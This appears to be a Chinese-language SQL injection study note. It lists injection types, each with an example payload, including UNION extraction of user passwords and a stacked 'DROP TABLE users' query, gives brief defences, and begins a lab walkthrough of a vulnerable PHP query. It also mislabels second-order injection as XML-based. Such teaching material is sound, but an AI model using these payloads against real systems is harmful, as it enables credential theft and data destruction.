## 注入类型总结

以下是常见的 SQL 注入类型及其特点的总结：

### 1.基础 SQL 注入（Classic SQL Injection）

通过直接在输入中插入 SQL 代码，改变原始查询逻辑

* **示例**：输入 `' OR '1'='1` 使条件永远为真

  ```sql
  ' OR '1'='1
  ```

### 2.联合查询注入（UNION-based SQL Injection）

利用 UNION 合并查询结果，获取其他表的数据

* **特点**：要求攻击者能够判断和匹配结果列的数量与类型

  ```sql
  ' UNION SELECT username, password FROM users --
  ```

### 3.盲注（Blind SQL Injection）

服务器没有返回具体错误信息，攻击者通过观察响应的行为推断查询结果

#### 3.1.布尔盲注（Boolean-based Blind Injection）

* **方式**：通过改变条件判断，观察页面返回的变化。

  ```sql
  ' AND 1=1 -- （页面正常）
  ' AND 1=2 -- （页面异常）
  ```

#### 3.2.时间盲注（Time-based Blind Injection）

* **方式**：利用数据库函数（如 `SLEEP()`）使查询延迟，推断结果

  ```sql
  ' AND IF(1=1, SLEEP(5), 0) --
  ```

### 4.错误注入（Error-based SQL Injection）

利用数据库返回的错误信息，获取敏感数据

* **特点**：通过触发错误或函数，直接暴露数据库结构或数据

  ```sql
  ' AND 1=CAST((SELECT @@version) AS INT) --
  ```

### 5.堆查询注入（Stacked Queries Injection）

允许一次执行多个 SQL 语句

* **特点**：需要数据库支持多语句执行（如 ; 分隔）

  ```sql
  '; DROP TABLE users; --
  ```

### 6.基于 XML 的 SQL 注入（Second-Order SQL Injection）

攻击者在初次输入时注入特定字符或语句，等数据被应用后触发注入

* **特点**：数据被存储后，在后续查询时注入生效

### 7.高级注入（Advanced SQL Injection）

结合其他技术（如 JSON、XPath、XML 等）或数据库特性进行复杂攻击



## SQL注入防御策略

* 使用 **参数化查询（Prepared Statements）** 或 ORM
* 验证和过滤用户输入，禁止特殊字符
* 限制数据库用户权限
* 定期检查和修补漏洞



## 第一关

### 源代码分析

```php
$id=$_GET['id'];
$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
$result=mysql_query($sql);
```

### 构造攻击 SQL

* 报错注入 : 

  ```sql
  id=1'
  ```

  ```sql
  SELECT * FROM users WHERE id='1'' LIMIT 0,1
  ```

  报错信息 :

  ```
  You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1'' LIMIT 0,1' at line 1
  ```

  尝试注释掉第二个符号 `'` 后 SQL 语句：

  ```sql
  id=1'--+
  ```

  ```sql
  SELECT * FROM users WHERE id='1'-- ' LIMIT 0,1 (通过 URL 解码后，`+`变成空格)
  ```

  值得注意的是：在 SQL 中，`--` 是行注释符，**但在某些数据库（如 MySQL）中，`--` 后面必须跟一个空格才能生效**，上述 SQL 注入语句中之所以在 `--` 后加 `+`，是因为在 SQL 注入中，有时无法直接在 `--` 后加空格（**例如在 URL 参数末尾输入空格符，空格可能被编码或移除**），此时使用 `+` 代替空格，这样可以保证注释符生效，正确注释掉后续内容 .

  * **`+` 在 URL 编码中表示空格，通过 URL 解码后，`--+` 实际变成 `--(空格)`**

  所以说只要能确保注释符生效，SQL注入语句也可写成下述形式，这里的 `s` 可以为任何其它字母，其作用是确保在 URL 编码时前面的空格不被移除.

  ```sql
  id=1'-- s
  ```

  ```sql
  SELECT * FROM users WHERE id='1'-- s' LIMIT 0,1
  ```